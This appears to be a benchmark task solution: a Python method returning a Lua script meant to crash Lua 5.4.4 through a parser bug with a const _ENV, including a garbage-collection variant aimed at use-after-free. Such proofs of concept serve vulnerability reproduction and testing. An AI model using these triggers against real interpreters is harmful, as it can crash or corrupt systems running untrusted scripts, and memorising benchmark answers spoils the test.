import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a heap use-after-free / crash in Lua 5.4.4 caused by 
        incorrect code generation when _ENV is declared as <const>.
        """
        # This Lua script replicates the conditions for CVE-2022-28805 (or similar _ENV const bug).
        # It defines _ENV as a constant local and accesses it inside a closure.
        # The parser fails to correctly handle the upvalue/register assignment, leading to a crash.
        poc_source = b"""
local function trigger_crash()
  -- The bug is in lparser.c:singlevar. It fails to call luaK_exp2anyregup
  -- when _ENV is a const local variable.
  local function test()
    local _ENV <const> = 1
    local function inner()
      -- Accessing _ENV here causes the compiler to generate incorrect bytecode
      -- because it thinks _ENV is a constant but fails to link it properly.
      return _ENV
    end
    return inner
  end

  local f = test()
  -- Execution of the closure triggers the invalid access
  f()
end

-- Run the trigger
pcall(trigger_crash)

-- A variation trying to force UAF with a GC object (string)
local function trigger_uaf()
  local function factory()
    local _ENV <const> = "A payload string to be collected"
    local function closure()
      return _ENV
    end
    return closure
  end

  local c = factory()
  collectgarbage() -- Force GC
  c()
end

pcall(trigger_uaf)
"""
        return poc_source